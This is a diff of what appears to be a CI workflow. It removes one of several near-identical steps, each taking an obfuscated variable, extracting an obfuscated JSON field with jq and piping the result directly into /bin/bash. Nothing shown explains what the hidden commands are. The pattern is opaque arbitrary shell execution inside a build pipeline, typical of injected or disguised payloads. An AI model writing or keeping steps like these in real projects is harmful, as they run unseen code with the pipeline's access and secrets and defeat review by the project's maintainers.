@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$nprt893" | jq -r .r32 | /bin/bash
           echo $ci2 | jq -r .nq934 | /bin/bash
           printf '%s' "$wpt7" | jq -r .hb89 | /bin/bash
-          echo $e4856 | jq -r .ek349 | /bin/bash
           printf '%s' "$wm5216" | jq -r .j2 | /bin/bash
           printf '%s' "$mrtm4" | jq -r .plp237 | /bin/bash
           printf '%s' "$laea4" | jq -r .pytui49051 | /bin/bash
